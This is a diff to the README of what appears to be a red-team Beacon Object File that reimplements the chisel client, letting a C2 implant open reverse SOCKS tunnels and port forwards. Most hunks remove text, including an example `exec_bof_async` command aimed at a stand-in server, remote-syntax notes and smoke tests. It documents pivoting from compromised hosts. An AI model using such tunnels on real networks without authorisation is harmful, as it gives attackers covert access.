@@ -7,22 +7,10 @@ exactly like the real `chisel client` process. It interoperates byte-for-byte wi
 unmodified chisel server** — proven against the official 1.12.0 binary, both directly and behind a
 public TLS front end.
 
-This repository carries **source only**: no releases, no tags, no binary assets, and none may ever
-be attached to it. Nothing binary is committed — `build.bat` builds everything from source on your
-machine, including the hash-verified Mbed TLS 3.6.7 static library. The reference build that every
-suite in `tests/` was run against (mingw-w64 8.1.0,
-msvcrt runtime, 2026-11-20) is 21,402,624 bytes,
-`sha256 d71f4a1a4e5aaa2dda83c127024e438f7a25f9ac214ca4f123b72dcf21d427d7`. Your own build will
-**not** hash-match it (the PE timestamp, plus the absolute `__FILE__` paths that Mbed TLS's debug
-build embeds, depend on where the dependency was unpacked). Check the shape instead: imports
-`ws2_32.dll` (13 winsock names) + `KERNEL32.dll` (`GetTickCount64`), export `go @1`, and zero
-out-of-image absolute slots from `tools/pehl2dir.py --audit` (587/587).
-
 ## Build
 
 ```
 build.bat                                   :: or: set TOOLCHAIN=C:\path\to\mingw64\bin && build.bat
-build.bat clean                             :: wipe build/ and deps/, rebuild from nothing
 ```
 
 Windows x64; mingw-w64 **x86_64** (tested: 8.1.0 msvcrt, winlibs GCC 16.2.0 posix-seh/UCRT);
@@ -46,11 +34,6 @@ and does nothing: [docs/build-problems.md](docs/build-problems.md).
 Outflank Security Tooling (OST), or any Beacon-family C2 with a BOF primitive: artifact
 `chiselbof.dll`, entry point `go`, then the server URL and the remote list.
 
-```
-exec_bof_async  zz  https://chisel.example.com  "R:1080:socks"
-```
-
-Always `https://` (or `wss://`) — the transport is TLS, so `ws://`/`http://` is not useful.
 Chisel's flags are ordinary arguments, passed either as more records with the dashes stripped, or
 as **one** record holding the whole command line (dashes legal there because the payload splits it;
 `"` groups a value that contains a space):
@@ -65,36 +48,6 @@ Server side, for `R:` remotes (`--auth` is chisel's own flag, checked inside SSH
 ```
 chisel server --port 8000 --reverse -v --auth "ops:pass"
 ```
-
-Two things that look wrong but are expected:
-
-1. **The task never completes.** The proxy is resident; `go()` returns only when it is killed. Use
-   the async variant so the beacon thread stays free — the tunnel lives as long as the implant does.
-2. **`R:` remotes bind on the SERVER, not on the beacon host.** Check where the server runs:
-
-   ```
-   ss -tlnp | grep :1080
-   curl -x socks5h://127.0.0.1:1080 -o /dev/null -w '%{http_code}\n' https://example.com
-   ```
-
-   With the server started `-v` you want `session#N: Open (… remotes=R:1080:socks)` and
-   `tun: Bound proxies`.
-
-Local smoke test, one machine, no C2:
-
-```
-chisel server --port 8406 --reverse -v --tls-cert cert.pem --tls-key key.pem
-build\pebdrv.exe build\chiselbof.dll https://127.0.0.1:8406 "R:1080:socks"
-```
-
-### Remote syntax (chisel-compatible)
-
-| feature | syntax | notes |
-|---|---|---|
-| SOCKS5 on the server | `R:1080:socks` | SOCKS5 hostname CONNECTs are resolved **on the client** (`socks5h` semantics) |
-| reverse port forward | `R:<bind>:<host>:<port>` | `R:127.0.0.1:2222:10.0.0.5:22` |
-| reverse UDP relay | `R:<bind>:<host>:<port>/udp` | chisel's gob `udpPacket{Src,Payload}` codec, source-peer fidelity (the DNS path) |
-| forward remote | `<lport>:<host>:<port>` | local listener on the beacon host |
 
 ### Flags
 
@@ -209,9 +162,6 @@ deps/mbedinc/mbedtls/mbedtls_config.h   trimmed config (load-bearing, see docs/b
 deps/chiselbof.def            DLL exports (`go @1`)      deps/WS2_32nat.def   winsock imports
 docs/  tests/                 notes (see above) and the suites
 ```
-
-Never committed, always generated: `build/`, `deps/MBED.a`, `deps/WS2_32nat.a`,
-`deps/mbedtls-*/`, `deps/_mbedtls-*.tar.gz`, `tests/pub/`.
 
 ## Third-party and licensing
 
